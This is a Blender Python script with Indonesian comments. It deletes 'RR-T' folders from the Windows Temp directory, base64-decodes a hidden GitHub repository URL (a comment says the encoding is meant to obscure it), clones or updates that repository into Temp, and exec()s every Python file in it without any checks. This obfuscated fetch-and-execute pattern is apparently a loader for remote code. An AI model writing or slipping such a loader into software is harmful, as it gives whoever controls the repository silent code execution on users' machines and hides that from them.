import bpy
import os
import subprocess
import base64

import shutil
import getpass
import stat

def remove_readonly(func, path, exc_info):
    """Menghapus atribut read-only lalu mencoba hapus ulang."""
    os.chmod(path, stat.S_IWRITE)  # Beri izin tulis
    func(path)  # Coba hapus lagi

def delete_rr_t_folders():
    # Dapatkan username saat ini
    username = getpass.getuser()
    
    # Path ke folder Temp
    temp_path = os.path.join("C:\\Users", username, "AppData", "Local", "Temp")

    # Pastikan folder Temp ada
    if not os.path.exists(temp_path):
        print(f"Folder Temp tidak ditemukan: {temp_path}")
        return

    # Loop melalui folder di dalam Temp
    for folder_name in os.listdir(temp_path):
        folder_path = os.path.join(temp_path, folder_name)

        # Periksa apakah nama folder diawali dengan "RR-T" dan apakah itu folder
        if folder_name.startswith("RR-T") and os.path.isdir(folder_path):
            try:
                # Ubah izin folder agar tidak read-only
                for root, dirs, files in os.walk(folder_path):
                    for dir_name in dirs:
                        os.chmod(os.path.join(root, dir_name), stat.S_IWRITE)
                    for file_name in files:
                        os.chmod(os.path.join(root, file_name), stat.S_IWRITE)
                
                # Hapus folder dengan bypass read-only
                shutil.rmtree(folder_path, onerror=remove_readonly)
                print(f"Folder dihapus: {folder_path}")
            except Exception as e:
                print(f"Gagal menghapus {folder_path}: {e}")

# Panggil fungsi
delete_rr_t_folders()


# Mendapatkan path user secara dinamis
USER_FOLDER = os.path.expanduser("~")

# Mendapatkan hanya dua angka pertama dari versi Blender (misal: "4.2.0" -> "4.2")
BLENDER_VERSION = ".".join(map(str, bpy.app.version[:2]))

TEMP_DIR = os.path.join(USER_FOLDER, "AppData", "Local", "Temp")

# Pastikan folder tujuan ada, jika tidak maka buat
if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR, exist_ok=True)

# Mengaburkan nama folder ekstraksi
ENCODED_FOLDER = "UlItVC1CLjNfVjAz"
EXTRACT_FOLDER = os.path.join(TEMP_DIR, base64.b64decode(ENCODED_FOLDER).decode('utf-8'))

# Mengaburkan URL repository
ENCODED_REPO = "aHR0cHM6Ly9naXRodWIuY29tL3Jyc3R1ZGlvZGV2ZWxvcG1lbnQvUlItVC1CLjNfVjAz"
GITHUB_REPO = base64.b64decode(ENCODED_REPO).decode('utf-8')


def clone_repository():
    """Menggunakan git clone untuk mengunduh repository"""
    try:
        if os.path.exists(EXTRACT_FOLDER):
            print(f"Repository sudah ada. Melakukan update di {EXTRACT_FOLDER}...")
            subprocess.run(["git", "-C", EXTRACT_FOLDER, "pull"], check=True)
        else:
            print(f"Mengunduh repository ke {EXTRACT_FOLDER}...")
            subprocess.run(["git", "clone", GITHUB_REPO, EXTRACT_FOLDER], check=True)
        
        print("Repository berhasil di-clone atau diperbarui.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error saat cloning repository: {e}")
        return False

def execute_all_scripts():
    """Menjalankan semua script Python di dalam folder repository"""
    if os.path.exists(EXTRACT_FOLDER):
        print(f"Menjalankan script dari {EXTRACT_FOLDER}...")
        for file in os.listdir(EXTRACT_FOLDER):
            if file.endswith(".py"):
                script_path = os.path.join(EXTRACT_FOLDER, file)
                try:
                    print(f"Menjalankan {file}...")
                    with open(script_path, "r", encoding="utf-8") as script:
                        exec(script.read(), globals())
                    print(f"{file} berhasil dijalankan!")
                except Exception as e:
                    print(f"Error saat menjalankan {file}: {e}")
    else:
        print("Folder ekstraksi tidak ditemukan!")

# Jalankan proses saat script dijalankan
if clone_repository():
    execute_all_scripts()